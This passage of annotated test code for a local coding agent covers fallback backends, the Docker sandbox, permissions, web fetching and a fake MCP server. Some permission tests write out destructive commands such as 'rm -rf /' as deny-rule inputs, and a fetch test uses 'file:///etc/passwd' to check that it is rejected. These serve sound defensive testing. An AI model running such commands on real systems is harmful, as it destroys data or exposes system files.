262 |         config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
263 |                          gemini_strong_models=("m2",), fallback_backend="openai", model="q")
264 |         self.assertIsInstance(make_backend(config), FallbackBackend)
265 |         self.assertEqual(model_label(config), "gemini:m1 > m2 > openai:q")
266 |         self.assertEqual(model_label(Config()), "ollama:qwen3:8b")
267 |         with self.assertRaises(ValueError):
268 |             make_backend(replace(config, fallback_backend="nope"))
269 | 
```
```python
270 |     def test_doctor_reports_missing_key(self):
271 |         healthy, lines = run_doctor(replace(Config(), backend="gemini", gemini_api_key=""))
272 |         self.assertFalse(healthy)
273 |         self.assertTrue(any("GEMINI_API_KEY" in line for line in lines))
274 | 
```
```python
275 |     def test_doctor_treats_a_missing_backup_as_a_note(self):
276 |         def fake_get(url, headers=None):
277 |             if url.startswith(Config().gemini_base):
278 |                 return {"data": [{"id": "models/m1"}, {"id": "models/m2"}]}
279 |             raise OSError("connection refused")             # the backup server is not running
280 |         with tempfile.TemporaryDirectory() as tmp, \
281 |                 mock.patch("localagent.doctor._get_json", side_effect=fake_get):
282 |             config = replace(Config(), backend="gemini", gemini_api_key="k", gemini_models=("m1",),
283 |                              gemini_strong_models=("m2",), fallback_backend="openai",
284 |                              usage_file=Path(tmp) / "usage.json")
285 |             healthy, lines = run_doctor(config)
286 |         self.assertTrue(healthy)                             # Gemini works: the backup is optional
287 |         self.assertFalse(any(line.startswith("FAIL") for line in lines))
288 |         self.assertTrue(any(line.startswith("note  the offline backup") for line in lines))
289 | 
290 | 
```
- Against the fake server: `reasoning_effort` is sent; the tool call's `extra_content` (thought signature) is kept on
  the stored message and sent back by `to_openai`; with 60 prompt + 20 completion but 150 total tokens, 90 are counted
  as completion (70 hidden thinking + 20).
- A tool call without a signature is sent unchanged to ordinary servers, but gets Google's placeholder signature when
  `fill_signatures` is on.
- The Gemini backend refuses to start without a key, builds a `FallbackBackend` with one, labels the chain correctly,
  and rejects an unknown fallback name. The doctor reports a missing key as a failure.
- With Gemini answering (its model list is faked with `mock.patch`) but the backup server unreachable, the doctor
  stays healthy, prints no `FAIL`, and prints a `note` about the backup.

## Runners
```python
291 | class RunnerTests(unittest.TestCase):
```
```python
292 |     def test_local_runner_refuses_shell_and_toolbox_hides_tool(self):
293 |         with tempfile.TemporaryDirectory() as tmp:
294 |             runner = LocalRunner(Config(), Path(tmp))
295 |             self.assertEqual(runner.run("shell", ["ls"])[0], 126)
296 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _a: True)
297 |             names = [spec["function"]["name"] for spec in box.specs()]
298 |             self.assertNotIn("run_shell", names)
299 |             box.close()
300 | 
```
```python
301 |     def test_docker_toolbox_offers_shell(self):
302 |         with tempfile.TemporaryDirectory() as tmp:
303 |             box = ToolBox(replace(Config(), workspace=Path(tmp), sandbox="docker"), lambda _a: True)
304 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
305 |             self.assertIn("ERROR", box.call("run_shell", {"command": "  "}))
306 |             box.close()                                      # never started: nothing to stop
307 | 
```
```python
308 |     @unittest.skipUnless(docker_available() and sandbox_image_ready("localagent-sandbox:latest"),
309 |                          "Docker is not running, or the sandbox image is not built")
310 |     def test_docker_sandbox_isolation_end_to_end(self):
311 |         with tempfile.TemporaryDirectory() as tmp:
312 |             config = replace(Config(), workspace=Path(tmp), sandbox="docker", command_timeout=20)
313 |             box = ToolBox(config, lambda _a: True)
314 |             try:
315 |                 box.call("write_file", {"path": "hi.py", "content": "print('from container')\n"})
316 |                 self.assertIn("from container", box.call("run_python", {"path": "hi.py"}))
317 |                 who = box.call("run_shell", {"command": "id -u && pwd"}).splitlines()
318 |                 self.assertEqual(who[0], "exit code 0")
319 |                 self.assertNotEqual(who[1], "0")             # not root
320 |                 self.assertEqual(who[2], "/work")
321 |                 net = box.call("run_shell", {"command": "python -c \"import urllib.request as u; "
322 |                                              "u.urlopen('http://example.com', timeout=5)\""})
323 |                 self.assertNotIn("exit code 0", net)         # no network by default
324 |                 slow = replace(config, command_timeout=2)
325 |                 runner = DockerRunner(slow, Path(tmp))
326 |                 code, _ = runner.run("shell", ["sleep 30"])
327 |                 runner.stop()
328 |                 self.assertEqual(code, 124)                  # timeout kills the command
329 |             finally:
330 |                 box.close()
331 | 
332 | 
```
- Locally the shell is refused (code 126) and the `run_shell` tool is not even offered to the model.
- With `sandbox="docker"` the tool is offered and an empty command is rejected — without starting a container.
- **Real Docker (skipped unless Docker runs *and* the sandbox image is built — CI's `sandbox` job builds it):** a
  written file runs in the container and prints `from container`; `id -u && pwd` shows a user id other than 0 (not
  root) in `/work`; opening a web page fails (no network); `sleep 30` with a 2-second limit returns the timeout code
  124. The container is removed in `finally`. The user is checked by its number, not by the name `agent`: on Linux the
  container runs as your own user id (see `runners.md`).

```python
333 | if __name__ == "__main__":
334 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase7.py` — the Claude-Code-like features

**Role:** proves the features that make the agent usable in any real project folder: fast folder walking, checks for
more languages, the `todo` checklist, the opt-in shell on this computer, compaction, `/init` and the defaults.
No model and no network are needed (scripted fakes again); the JavaScript test runs only when Node.js is installed.

## Helpers
```python
  1 | """Tests for the Claude-Code-like features: any-folder use, more languages, todo, shell, compaction."""
  2 | import importlib.util
  3 | import json
  4 | import os
  5 | import shutil
  6 | import tempfile
  7 | import unittest
  8 | from dataclasses import replace
  9 | from pathlib import Path
 10 | 
 11 | from localagent.agent import COMPACT_PROMPT, Agent
 12 | from localagent.checkpoint import Checkpoints
 13 | from localagent.cli import INIT_PROMPT, build_config, build_parser
 14 | from localagent.config import Config
 15 | from localagent.context import project_tree
 16 | from localagent.meter import Meter
 17 | from localagent.runners import LocalRunner
 18 | from localagent.sandbox import walk_files
 19 | from localagent.tools import ToolBox
 20 | from localagent.verify import verify_file
 21 | 
 22 | from .test_agent import FakeBackend, tool_call
 23 | 
 24 | 
```
- Imports the pieces under test and the fake model helpers from `test_agent.py`.

```python
 25 | def box_for(tmp: str, **kw) -> ToolBox:
 26 |     """ToolBox on a temp folder that approves everything."""
 27 |     return ToolBox(replace(Config(), workspace=Path(tmp), **kw), approve=lambda _a: True)
 28 | 
 29 | 
```
- A toolbox on a temporary folder that approves everything; extra settings can be passed.

## Folder walking
```python
 30 | class WalkTests(unittest.TestCase):
```
```python
 31 |     def test_skipped_folders_are_never_entered(self):
 32 |         with tempfile.TemporaryDirectory() as tmp:
 33 |             root = Path(tmp)
 34 |             for name in ("src/app.py", "node_modules/pkg/index.js", ".localagent/x.json",
 35 |                          "venv/lib/a.py", "README.md"):
 36 |                 (root / name).parent.mkdir(parents=True, exist_ok=True)
 37 |                 (root / name).write_text("x", encoding="utf-8")
 38 |             found = [p.relative_to(root).as_posix() for p in walk_files(root)]
 39 |             self.assertEqual(found, ["README.md", "src/app.py"])          # sorted, pruned
 40 |             self.assertEqual(project_tree(root, 10), "README.md\nsrc/app.py")
 41 |             snap = Checkpoints(root)
 42 |             snap.take()
 43 |             (root / "node_modules/pkg/index.js").write_text("changed", encoding="utf-8")
 44 |             self.assertEqual(snap.undo(), "nothing to undo")              # not snapshotted at all
 45 | 
```
```python
 46 |     def test_search_uses_glob_on_file_names(self):
 47 |         with tempfile.TemporaryDirectory() as tmp:
 48 |             box = box_for(tmp)
 49 |             (Path(tmp) / "a.js").write_text("const needle = 1;\n", encoding="utf-8")
 50 |             (Path(tmp) / "b.py").write_text("needle = 2\n", encoding="utf-8")
 51 |             self.assertIn("a.js:1", box.call("search", {"pattern": "needle", "glob": "*.js"}))
 52 |             self.assertNotIn("a.js", box.call("search", {"pattern": "needle", "glob": "*.py"}))
 53 |             self.assertIn("a.js:1", box.call("search", {"pattern": "needle"}))   # default: all
 54 | 
 55 | 
```
- A project with `node_modules`, `.localagent` and `venv` folders: only `README.md` and `src/app.py` are found (sorted),
  the prompt's file list shows exactly those two, and a change inside `node_modules` is invisible to `/undo` snapshots.
- `search` with `glob: *.js` finds a match in a JavaScript file; the default (`*.py`) does not look at it.

## Languages
```python
 56 | class LanguageTests(unittest.TestCase):
```
```python
 57 |     def check(self, name: str, text: str) -> bool:
 58 |         with tempfile.TemporaryDirectory() as tmp:
 59 |             path = Path(tmp) / name
 60 |             path.write_text(text, encoding="utf-8")
 61 |             return verify_file(path, Path(tmp)).ok
 62 | 
```
```python
 63 |     def test_json_and_toml(self):
 64 |         self.assertTrue(self.check("a.json", '{"a": 1}'))
 65 |         self.assertFalse(self.check("a.json", '{"a": 1,}'))
 66 |         self.assertTrue(self.check("p.toml", 'name = "x"\n'))
 67 |         if importlib.util.find_spec("tomllib"):          # Python 3.11+; on 3.10 TOML is not checked
 68 |             self.assertFalse(self.check("p.toml", "name = \n"))
 69 |         self.assertTrue(self.check("notes.md", "anything at all {"))           # unchecked type
 70 | 
```
```python
 71 |     @unittest.skipUnless(shutil.which("node"), "Node.js not installed")
 72 |     def test_javascript_with_node(self):
 73 |         self.assertTrue(self.check("a.js", "const x = 1;\nmodule.exports = { x };\n"))
 74 |         self.assertFalse(self.check("a.js", "const x = ;\n"))
 75 | 
```
```python
 76 |     def test_bad_json_write_is_rolled_back_and_workspace_check_sees_it(self):
 77 |         with tempfile.TemporaryDirectory() as tmp:
 78 |             box = box_for(tmp)
 79 |             self.assertIn("REJECTED", box.call("write_file", {"path": "c.json", "content": "{oops"}))
 80 |             self.assertFalse((Path(tmp) / "c.json").exists())
 81 |             (Path(tmp) / "d.json").write_text("[1,", encoding="utf-8")            # broken behind our back
 82 |             self.assertEqual(len(box.check_workspace()), 1)
 83 | 
 84 | 
```
- `check` writes a file and runs `verify_file` on it.
- Valid JSON/TOML pass; a trailing comma in JSON and a missing TOML value fail (the TOML failure only on Python
  3.11+, which has a TOML reader built in — CI's Python 3.10 job showed the test assumed it); a Markdown file is never
  checked.
- With Node.js: valid JavaScript passes, `const x = ;` fails.
- Writing broken JSON is rejected and rolled back (the file does not exist); a broken JSON file made outside the agent is
  reported by the end-of-request workspace check.

## Todo and shell
```python
 85 | class TodoAndShellTests(unittest.TestCase):
```
```python
 86 |     def test_todo_checklist(self):
 87 |         with tempfile.TemporaryDirectory() as tmp:
 88 |             box = box_for(tmp)
 89 |             out = box.call("todo", {"items": [{"text": "read", "done": True}, {"text": "write"}]})
 90 |             self.assertEqual(out.splitlines(), ["TODO 1/2 done", "  [x] read", "  [ ] write"])
 91 |             self.assertEqual(len(box.todo), 2)
 92 |             self.assertIn("ERROR", box.call("todo", {"items": []}))
 93 |             self.assertIn("[ ] plain text", box.call("todo", {"items": ["plain text"]}))
 94 | 
```
```python
 95 |     def test_host_shell_is_opt_in_and_asks(self):
 96 |         with tempfile.TemporaryDirectory() as tmp:
 97 |             self.assertNotIn("run_shell", [s["function"]["name"] for s in box_for(tmp).specs()])
 98 |             asked: list[str] = []
 99 |             cfg = replace(Config(), workspace=Path(tmp), allow_host_shell=True)
100 |             box = ToolBox(cfg, approve=lambda action: asked.append(action) or True)
101 |             self.assertIn("run_shell", [s["function"]["name"] for s in box.specs()])
102 |             out = box.call("run_shell", {"command": "echo hello-shell"})
103 |             self.assertIn("hello-shell", out)
104 |             self.assertTrue(asked and "echo hello-shell" in asked[0])
105 |             refused = LocalRunner(Config(), Path(tmp)).run("shell", ["echo x"])
106 |             self.assertEqual(refused[0], 126)
107 | 
```
```python
108 |     def test_todo_progress_is_shown_in_full(self):
109 |         with tempfile.TemporaryDirectory() as tmp:
110 |             cfg = replace(Config(), workspace=Path(tmp))
111 |             script = [tool_call("todo", items=[{"text": "step one"}, {"text": "step two"}]),
112 |                       {"role": "assistant", "content": "ok"}]
113 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _a: True), Meter())
114 |             events: list[str] = []
115 |             agent.run("Plan it", on_event=events.append)
116 |             self.assertIn("     [ ] step two", events)
117 | 
118 | 
```
- The checklist renders as `TODO 1/2 done` + `[x]`/`[ ]` lines; an empty list is an error; plain-text items work too
  (the real model sent plain strings the first time).
- Without `--allow-shell` there is no `run_shell` tool. With it, `echo hello-shell` runs (through PowerShell on
  Windows), and the approval question contained the command. A runner without the flag refuses with code 126.
- When the model sends a checklist, every line of it reaches the progress display.

## Compaction and notes
```python
119 | class CompactionTests(unittest.TestCase):
```
```python
120 |     def make(self, tmp, script, **kw):
121 |         cfg = replace(Config(), workspace=Path(tmp), **kw)
122 |         backend = FakeBackend(script)
123 |         return Agent(cfg, backend, ToolBox(cfg, lambda _a: True), Meter()), backend
124 | 
```
```python
125 |     def test_manual_compact_replaces_history_with_summary(self):
126 |         with tempfile.TemporaryDirectory() as tmp:
127 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "one"},
128 |                                        {"role": "assistant", "content": "two"},
129 |                                        {"role": "assistant", "content": "SUMMARY: user wants X"}])
130 |             self.assertEqual(agent.compact(), "nothing to compact")
131 |             agent.run("first question")
132 |             agent.run("second question")
133 |             result = agent.compact()
134 |             self.assertIn("compacted", result)
135 |             self.assertEqual([m["role"] for m in agent.messages], ["system", "user", "assistant"])
136 |             self.assertIn("SUMMARY: user wants X", agent.messages[1]["content"])
137 | 
```
```python
138 |     def test_empty_summary_keeps_history(self):
139 |         with tempfile.TemporaryDirectory() as tmp:
140 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "a"},
141 |                                        {"role": "assistant", "content": "b"},
142 |                                        {"role": "assistant", "content": ""}])
143 |             agent.run("q1")
144 |             agent.run("q2")
145 |             before = len(agent.messages)
146 |             self.assertIn("skipped", agent.compact())
147 |             self.assertEqual(len(agent.messages), before)
148 | 
```
```python
149 |     def test_automatic_compaction_before_a_request(self):
150 |         with tempfile.TemporaryDirectory() as tmp:
151 |             agent, _ = self.make(tmp, [{"role": "assistant", "content": "x" * 400}] * 3
152 |                                  + [{"role": "assistant", "content": "SUM"},
153 |                                     {"role": "assistant", "content": "answer"}],
154 |                                  num_ctx=3000, compact_at=0.1)   # the system prompt must fit
155 |             for question in ("q1", "q2", "q3"):
156 |                 agent.run(question)
157 |             events: list[str] = []
158 |             self.assertEqual(agent.run("q4", on_event=events.append), "answer")
159 |             self.assertTrue(any("summarising" in e for e in events))
160 |             self.assertIn("SUM", agent.messages[1]["content"])
161 |             self.assertIn("300 words", COMPACT_PROMPT)
162 | 
```
```python
163 |     def test_reset_and_refresh_reload_agent_notes(self):
164 |         with tempfile.TemporaryDirectory() as tmp:
165 |             agent, _ = self.make(tmp, [])
166 |             self.assertNotIn("USE TABS", agent.messages[0]["content"])
167 |             (Path(tmp) / "AGENT.md").write_text("USE TABS", encoding="utf-8")
168 |             agent.refresh_system()
169 |             self.assertIn("USE TABS", agent.messages[0]["content"])
170 |             agent.reset()
171 |             self.assertEqual(len(agent.messages), 1)
172 |             self.assertIn("USE TABS", agent.messages[0]["content"])
173 | 
174 | 
```
- A fresh agent has nothing to compact. After two requests, `compact()` leaves exactly system + summary + "Understood",
  with the model's summary inside.
- An empty summary changes nothing.
- With a tiny context (1000 tokens) and `compact_at=0.1`, the fourth request is preceded by an automatic summary (a
  progress line says so) and still gets its answer.
- After `AGENT.md` appears, `refresh_system` puts its text in the system prompt; `reset` keeps it and clears the rest.

## Any-folder defaults
```python
175 | class AnyFolderTests(unittest.TestCase):
```
```python
176 |     def test_defaults_work_in_current_folder_with_global_quota_file(self):
177 |         self.assertEqual(Config().workspace, Path("."))
178 |         self.assertEqual(Config().usage_file, Path.home() / ".localagent" / "usage.json")
179 |         args = build_parser().parse_args(["--allow-shell"])
180 |         self.assertTrue(build_config(args).allow_host_shell)
181 |         self.assertTrue(INIT_PROMPT.startswith("Create AGENT.md"))
182 | 
```
```python
183 |     def test_usage_file_can_be_moved_by_environment(self):
184 |         old = os.environ.get("LOCALAGENT_USAGE_FILE")
185 |         os.environ["LOCALAGENT_USAGE_FILE"] = "elsewhere.json"
186 |         try:
187 |             self.assertEqual(Config.from_env().usage_file, Path("elsewhere.json"))
188 |         finally:
189 |             if old is None:
190 |                 del os.environ["LOCALAGENT_USAGE_FILE"]
191 |             else:
192 |                 os.environ["LOCALAGENT_USAGE_FILE"] = old
193 |         self.assertTrue(json.dumps(str(Config().usage_file)))
194 | 
195 | 
```
- The workspace defaults to the current folder; the quota file lives in the home folder; `--allow-shell` reaches the
  config; `/init`'s request asks for `AGENT.md`.
- `LOCALAGENT_USAGE_FILE` moves the quota file (the test restores the environment afterwards).

```python
196 | if __name__ == "__main__":
197 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase8.py` — permissions, web pages, MCP, plan mode, interrupts, diffs, CLI helpers

**Role:** proves the Claude-Code-style features of the latest phase without a model or the internet: a local web server
stands in for websites, and a tiny MCP server written inside this file stands in for real MCP servers.

## Helpers
```python
  1 | """Tests for permissions, web pages, MCP servers, plan mode, interrupts, diffs and the CLI helpers."""
  2 | import contextlib
  3 | import importlib.util
  4 | import io
  5 | import json
  6 | import os
  7 | import sys
  8 | import tempfile
  9 | import threading
 10 | import unittest
 11 | from dataclasses import replace
 12 | from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 13 | from pathlib import Path
 14 | from unittest import mock
 15 | 
 16 | from localagent.agent import INTERRUPTED, NOT_ALLOWED, PLAN_ONLY_ERROR, Agent
 17 | from localagent.cli import (Approver, auto_configure, build_parser, handle_request, read_request,
 18 |                             sessions_folder)
 19 | from localagent.config import GEMINI_CONTEXT, Config, gemini_history, overlay
 20 | from localagent.mcp import MCPError, MCPServer, clean_schema
 21 | from localagent.meter import Meter
 22 | from localagent.sandbox import shell_argv
 23 | from localagent.ratelimit import RateLimiter
 24 | from localagent.settings import Permissions, load_settings, matches, parse_rule, suggest_rule
 25 | from localagent.tools import TOGETHER_HINT, Approval, ToolBox
 26 | from localagent.web import fetch_text, html_to_text
 27 | 
 28 | from .test_agent import FakeBackend, tool_call
 29 | 
 30 | FAKE_MCP_SERVER = r'''
 31 | import json, sys
 32 | 
 33 | def send(message):
 34 |     sys.stdout.write(json.dumps(message) + "\n")
 35 |     sys.stdout.flush()
 36 | 
 37 | for line in sys.stdin:
 38 |     message = json.loads(line)
 39 |     method, ident = message.get("method"), message.get("id")
 40 |     if method == "initialize":
 41 |         send({"jsonrpc": "2.0", "id": "s1", "method": "roots/list"})      # a question for the client
 42 |         send({"jsonrpc": "2.0", "id": ident, "result": {"protocolVersion": "2025-06-18",
 43 |               "capabilities": {"tools": {}}, "serverInfo": {"name": "fake", "version": "1"}}})
 44 |     elif method == "tools/list" and not message.get("params", {}).get("cursor"):
 45 |         schema = {"$schema": "x", "type": "object", "additionalProperties": False,
 46 |                   "properties": {"text": {"type": ["string", "null"]}}, "required": ["text"]}
 47 |         send({"jsonrpc": "2.0", "id": ident, "result": {"nextCursor": "page2", "tools": [
 48 |             {"name": "echo", "description": "Echo text back", "inputSchema": schema}]}})
 49 |     elif method == "tools/list":
 50 |         send({"jsonrpc": "2.0", "id": ident, "result": {"tools": [{"name": "fail"}]}})
 51 |     elif method == "tools/call":
 52 |         params = message["params"]
 53 |         if params["name"] == "echo":
 54 |             text = "echo: " + str(params["arguments"].get("text"))
 55 |             send({"jsonrpc": "2.0", "id": ident, "result": {"content": [{"type": "text", "text": text}]}})
 56 |         else:
 57 |             send({"jsonrpc": "2.0", "id": ident, "result": {"isError": True,
 58 |                   "content": [{"type": "text", "text": "it broke"}, {"type": "image"}]}})
 59 | '''
 60 | 
 61 | 
```
- Imports the pieces under test. `FAKE_MCP_SERVER` is the full source of a minimal MCP server: it answers the
  handshake (first sending the client a question of its own, `roots/list`, to prove the client copes), lists its tools
  in **two pages** (`echo` with a deliberately messy schema, then `fail`), echoes text, and reports an error result
  for `fail` (with an image part, to test that non-text content is named, not dumped).

```python
 62 | def write_server(folder: str) -> list[str]:
 63 |     """Save the fake MCP server; return the settings entry that starts it."""
 64 |     path = Path(folder) / "fake_mcp.py"
 65 |     path.write_text(FAKE_MCP_SERVER, encoding="utf-8")
 66 |     return [sys.executable, str(path)]
 67 | 
 68 | 
```
- Saves that source to a temporary file and returns the command that starts it with this Python.

## Permissions
```python
 69 | class PermissionTests(unittest.TestCase):
```
```python
 70 |     def test_rules_match_tools_and_subjects(self):
 71 |         self.assertEqual(parse_rule("run_shell(git *)"), ("run_shell", "git *"))
 72 |         self.assertEqual(parse_rule(" run_tests "), ("run_tests", None))
 73 |         self.assertTrue(matches("run_shell(git *)", "run_shell", "git status"))
 74 |         self.assertFalse(matches("run_shell(git *)", "run_shell", "rm -rf x"))
 75 |         self.assertTrue(matches("mcp__files__*", "mcp__files__read", "{}"))
 76 |         rules = Permissions(allow=["run_shell(*)"], deny=["run_shell(*rm *)"])
 77 |         self.assertEqual(rules.decide("run_shell", "ls"), "allow")
 78 |         self.assertEqual(rules.decide("run_shell", "rm -rf /"), "deny")   # deny wins
 79 |         self.assertEqual(rules.decide("run_tests", ""), "ask")
 80 | 
```
```python
 81 |     def test_suggested_rules_are_narrow(self):
 82 |         self.assertEqual(suggest_rule("run_shell", "git status"), "run_shell(git status)")
 83 |         self.assertEqual(suggest_rule("fetch_url", "https://docs.python.org/3/x.html"),
 84 |                          "fetch_url(https://docs.python.org/*)")
 85 |         self.assertEqual(suggest_rule("run_tests", ""), "run_tests")
 86 | 
```
```python
 87 |     def test_settings_merge_and_always_allow_is_saved(self):
 88 |         with tempfile.TemporaryDirectory() as tmp:
 89 |             user = Path(tmp) / "user.json"
 90 |             user.write_text(json.dumps({"permissions": {"deny": ["run_shell(*rm *)"]},
 91 |                                         "mcpServers": {"a": {"command": "x"}}}), encoding="utf-8")
 92 |             project = Path(tmp) / ".localagent" / "settings.json"
 93 |             project.parent.mkdir()
 94 |             project.write_text(json.dumps({"permissions": {"allow": ["run_tests"]}}), encoding="utf-8")
 95 |             merged = load_settings(Path(tmp), user)
 96 |             self.assertEqual(merged["permissions"], {"allow": ["run_tests"], "deny": ["run_shell(*rm *)"]})
 97 |             self.assertIn("a", merged["mcpServers"])
 98 |             rules = Permissions.from_settings(merged, project)
 99 |             self.assertEqual(rules.always_allow("run_shell(ls)"), project)
100 |             saved = json.loads(project.read_text(encoding="utf-8"))
101 |             self.assertEqual(saved["permissions"]["allow"], ["run_tests", "run_shell(ls)"])
102 |             project.write_text("{broken", encoding="utf-8")
103 |             with self.assertRaisesRegex(ValueError, "not valid JSON"):
104 |                 load_settings(Path(tmp), user)
105 | 
```
```python
106 |     def test_toolbox_applies_rules_before_asking(self):
107 |         with tempfile.TemporaryDirectory() as tmp:
108 |             asked: list[str] = []
109 |             cfg = replace(Config(), workspace=Path(tmp))
110 |             box = ToolBox(cfg, lambda q: asked.append(q) or False,
111 |                           {"permissions": {"allow": ["run_tests"], "deny": ["run_python(*)"]}})
112 |             box.call("write_file", {"path": "a.py", "content": "print(1)\n"})
113 |             self.assertIn("deny rule", box.call("run_python", {"path": "a.py"}))
114 |             self.assertIn("exit code", box.call("run_tests", {}))       # allowed: not asked
115 |             self.assertEqual(asked, [])
116 |             box.permissions.allow.clear()
117 |             self.assertIn("DENIED", box.call("run_tests", {}))          # asked, user said no
118 |             self.assertIsInstance(asked[0], Approval)
119 |             self.assertEqual((asked[0].tool, asked[0].subject), ("run_tests", ""))
120 | 
121 | 
```
- Rule parsing and matching, wildcard tool names (`mcp__files__*`), and **deny beats allow**; unmatched → ask.
- "Always" suggestions: the exact command, the whole website, the bare `run_tests`.
- A user file (deny + an MCP server) and a project file (allow) merge; `always_allow` appends to the project file on
  disk; a broken project file is reported as invalid JSON.
- In the toolbox: a denied `run_python` is refused without asking, an allowed `run_tests` runs without asking, and with
  the allow rule removed the question arrives as an `Approval` carrying tool and subject; a "no" gives `DENIED`.

## Web pages
```python
122 | class WebTests(unittest.TestCase):
123 |     PAGE = (b"<html><head><title>t</title><style>x{}</style></head><body><h1>Title</h1>"
124 |             b"<p>Hello   <b>world</b></p><script>var hidden=1;</script><ul><li>one</li></ul></body></html>")
125 | 
```
```python
126 |     def serve(self, status=200, body=PAGE, ctype="text/html; charset=utf-8"):
127 |         class Handler(BaseHTTPRequestHandler):
128 |             def do_GET(self):
129 |                 self.send_response(status)
130 |                 self.send_header("Content-Type", ctype)
131 |                 self.end_headers()
132 |                 self.wfile.write(body)
133 | 
134 |             def log_message(self, *args):
135 |                 pass
136 | 
137 |         server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
138 |         threading.Thread(target=server.serve_forever, daemon=True).start()
139 |         self.addCleanup(server.server_close)
140 |         self.addCleanup(server.shutdown)
141 |         return f"http://127.0.0.1:{server.server_port}/page"
142 | 
```
```python
143 |     def test_html_becomes_visible_text(self):
144 |         text = html_to_text(self.PAGE.decode())
145 |         self.assertEqual(text, "Title\n\nHello world\n\none")
146 |         self.assertNotIn("hidden", text)
147 | 
```
```python
148 |     def test_fetch_and_errors(self):
149 |         self.assertEqual(fetch_text(self.serve()), "Title\n\nHello world\n\none")
150 |         self.assertEqual(fetch_text(self.serve(body=b"plain", ctype="text/plain")), "plain")
151 |         with self.assertRaisesRegex(ValueError, "HTTP 404"):
152 |             fetch_text(self.serve(status=404))
153 |         with self.assertRaisesRegex(ValueError, "only http"):
154 |             fetch_text("file:///etc/passwd")
155 | 
```
```python
156 |     def test_fetch_tool_asks_and_obeys_rules(self):
157 |         with tempfile.TemporaryDirectory() as tmp:
158 |             url = self.serve()
159 |             cfg = replace(Config(), workspace=Path(tmp))
160 |             self.assertIn("Hello world", ToolBox(cfg, lambda _q: True).call("fetch_url", {"url": url}))
161 |             self.assertIn("DENIED", ToolBox(cfg).call("fetch_url", {"url": url}))     # nobody approved
162 |             denied = ToolBox(cfg, lambda _q: True, {"permissions": {"deny": ["fetch_url"]}})
163 |             self.assertIn("deny rule", denied.call("fetch_url", {"url": url}))
164 |             self.assertIn("ERROR", ToolBox(cfg, lambda _q: True).call("fetch_url", {"url": "ftp://x"}))
165 | 
166 | 
```
- `serve` starts a local web server that answers every request with a chosen status, body and content type.
- A page with a title, a style block, bold text, a script and a list becomes exactly
  `Title / Hello world / one` (the script text never appears).
- Fetching HTML and plain text works; a 404 and a `file://` address raise readable errors.
- Through the tool: approved → page text; nobody to approve → `DENIED`; a deny rule → refused; an `ftp://` address →
  `ERROR`.

## MCP
```python
167 | class MCPTests(unittest.TestCase):
```
```python
168 |     def test_schema_cleaning(self):
169 |         cleaned = clean_schema({"$schema": "x", "type": "object", "additionalProperties": False,
170 |                                 "properties": {"a": {"type": ["integer", "null"]},
171 |                                                "b": {"items": {"type": "string"}}}})
172 |         self.assertEqual(cleaned, {"type": "object", "properties": {
173 |             "a": {"type": "integer", "nullable": True},
174 |             "b": {"items": {"type": "string"}, "type": "string"}}})
175 |         self.assertEqual(clean_schema(None), {"type": "object", "properties": {}})
176 | 
```
```python
177 |     def test_server_tools_through_the_toolbox(self):
178 |         with tempfile.TemporaryDirectory() as tmp:
179 |             command = write_server(tmp)
180 |             settings = {"mcpServers": {"fake": {"command": command[0], "args": command[1:]},
181 |                                        "broken": {"command": "no-such-program-xyz"},
182 |                                        "empty": {}}}
183 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True, settings)
184 |             try:
185 |                 names = [s["function"]["name"] for s in box.specs()]
186 |                 self.assertIn("mcp__fake__echo", names)
187 |                 self.assertIn("mcp__fake__fail", names)                  # second page of the list
188 |                 echo = next(s for s in box.specs() if s["function"]["name"] == "mcp__fake__echo")
189 |                 self.assertNotIn("$schema", json.dumps(echo))
190 |                 self.assertEqual(box.call("mcp__fake__echo", {"text": "hi"}), "echo: hi")
191 |                 self.assertTrue(box.call("mcp__fake__fail", {}).startswith("ERROR: it broke"))
192 |                 self.assertTrue(any("2 tool(s)" in n for n in box.notes))
193 |                 self.assertTrue(any("broken" in n and "skipped" in n for n in box.notes))
194 |                 self.assertTrue(any("empty" in n and "command" in n for n in box.notes))
195 |                 box.permissions.deny.append("mcp__fake__*")
196 |                 self.assertIn("deny rule", box.call("mcp__fake__echo", {"text": "x"}))
197 |             finally:
198 |                 box.close()
199 | 
```
```python
200 |     def test_timeout_and_stopped_server(self):
201 |         with tempfile.TemporaryDirectory() as tmp:
202 |             command = write_server(tmp)
203 |             server = MCPServer("fake", command[0], command[1:], timeout=5).start()
204 |             with self.assertRaisesRegex(MCPError, "did not answer"):
205 |                 server.request("never/answered", timeout=0.5)
206 |             server.close()
207 |             proc = server._proc
208 |             assert proc is not None and proc.stdin is not None and proc.stdout is not None
209 |             self.assertIsNotNone(proc.poll())                               # the program has ended
210 |             self.assertTrue(proc.stdin.closed and proc.stdout.closed)       # no handle left open
211 |             with self.assertRaises(MCPError):
212 |                 server.call_tool("echo", {"text": "late"})
213 | 
214 | 
```
- Schema cleaning drops `$schema`/`additionalProperties`, turns `["integer","null"]` into integer + nullable, fills
  missing types, and replaces a missing schema with "no arguments".
- With three configured servers — the fake one, one whose program does not exist, one without a command — the toolbox
  offers `mcp__fake__echo` and `mcp__fake__fail` (from both pages), the echo works, the failing tool returns `ERROR`,
  the notes report 2 tools and both skipped servers, and a deny rule on `mcp__fake__*` blocks calls.
- A request the server never answers times out with a clear message; after `close` the program has ended, both of
  its pipes are closed (no leaked file handles), and calls fail with `MCPError`.

## Agent features
```python
215 | class RecordingBackend(FakeBackend):
216 |     """Also remembers which tool names were offered on each call."""
217 | 
```
```python
218 |     def __init__(self, messages):
219 |         super().__init__(messages)
220 |         self.offered: list[list[str]] = []
221 | 
```
```python
222 |     def chat(self, messages, tools, on_token=None):
223 |         self.offered.append([t["function"]["name"] for t in tools])
224 |         return super().chat(messages, tools, on_token)
225 | 
226 | 
```
- A fake model that also records which tool names it was offered on each call.

```python
227 | class AgentFeatureTests(unittest.TestCase):
```
```python
228 |     def make(self, tmp, backend, **kw):
